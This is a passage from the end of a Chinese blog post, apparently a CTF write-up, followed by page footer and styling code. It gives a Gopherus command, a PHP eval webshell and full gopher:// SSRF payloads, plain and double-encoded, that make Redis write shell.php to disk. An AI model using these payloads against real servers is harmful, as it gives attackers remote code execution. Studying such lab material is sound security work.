+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> gopherus.py --exploit redis<br><br><span class="hljs-attribute">php</span><br><br><span class="hljs-section">&lt;?php eval($_POST[1]);?&gt;</span><br><br><span class="hljs-attribute">gopher</span>://<span class="hljs-number">127.0.0.1:6379</span>/_%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">248</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aflushall%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A3%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">241</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2428</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_post%<span class="hljs-number">5</span>B1%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adir%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2424</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>eval%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>_post%<span class="hljs-number">5</span>B1%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A4%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">246</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aconfig%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">243</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Aset%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2410</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Adbfilename%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">249</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Ashell.php%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">2</span>A1%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">244</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>Asave%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure>
+
+<p>再次编码得到</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%42</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%42</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><br></code></pre></td></tr></table></figure>
+
+<p>发包，拿到webshell，直接读flag</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+
+
+    <div id="comments">
+    <script>
+        {
+            const comments = document.getElementById("comments");
+            const script = document.createElement("script");
+            script.src = "https://giscus.app/client.js";
+            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
+            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
+            script.setAttribute('data-category', "Announcements");
+            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
+            script.setAttribute('data-mapping', "pathname");
+            script.setAttribute('data-strict', "0");
+            script.setAttribute('data-reactions-enabled', "1");
+            script.setAttribute('data-emit-metadata', "0");
+            script.setAttribute('data-input-position', "top");
+            script.setAttribute('data-theme', "noborder_dark");
+            script.setAttribute('data-lang', "zh-CN");
+            script.setAttribute('data-loading', "lazy");
+            script.setAttribute('crossorigin', "anonymous");
+            script.setAttribute('async', "");
+            comments.appendChild(script);
+        }
+    </script>
+</div>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©MIXBP 2024
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/background.jpg);
+    }
+    
+    
+    #post .index {
+        background: url(/img/background2.jpg);
+    }
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.5;
+        background: url("/img/bjtp.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
+    
+</div>
+
+
+</html>
